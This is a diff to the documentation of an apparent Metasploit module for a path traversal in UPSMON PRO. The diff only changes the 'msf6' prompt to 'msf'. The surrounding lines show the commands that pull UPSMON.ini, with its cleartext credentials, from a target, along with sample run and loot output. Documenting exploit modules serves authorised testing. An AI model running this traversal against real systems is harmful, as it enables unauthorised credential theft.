@@ -26,9 +26,9 @@ By default, the server listens on TCP port 8000 on all network interfaces and ru
 3. Start `msfconsole` and run the following commands:
 
 ```
-msf6 > use auxiliary/gather/upsmon_traversal
-msf6 auxiliary(gather/upsmon_traversal) > set RHOSTS <IP>
-msf6 auxiliary(gather/upsmon_traversal) > run
+msf > use auxiliary/gather/upsmon_traversal
+msf auxiliary(gather/upsmon_traversal) > set RHOSTS <IP>
+msf auxiliary(gather/upsmon_traversal) > run
 ```
 
 This should return the UPSMON PRO configuration file, UPSMON.ini, which contains various cleartext credentials. Any files retrieved will
@@ -50,7 +50,7 @@ The traversal depth. The FILE path will be prepended with ../ * DEPTH.
 Running the exploit against v2.61 on Windows 22H22 should result in an output similar to the following:
 
 ```
-msf6 auxiliary(gather/upsmon_traversal) > run
+msf auxiliary(gather/upsmon_traversal) > run
 [*] Running module against 192.168.137.218
 
 [*] Running automatic check ("set AutoCheck false" to disable)
@@ -75,7 +75,7 @@ msf6 auxiliary(gather/upsmon_traversal) > run
 The file will be stored as loot:
 
 ```
-msf6 auxiliary(gather/upsmon_traversal) > loot
+msf auxiliary(gather/upsmon_traversal) > loot
 
 Loot
 ====
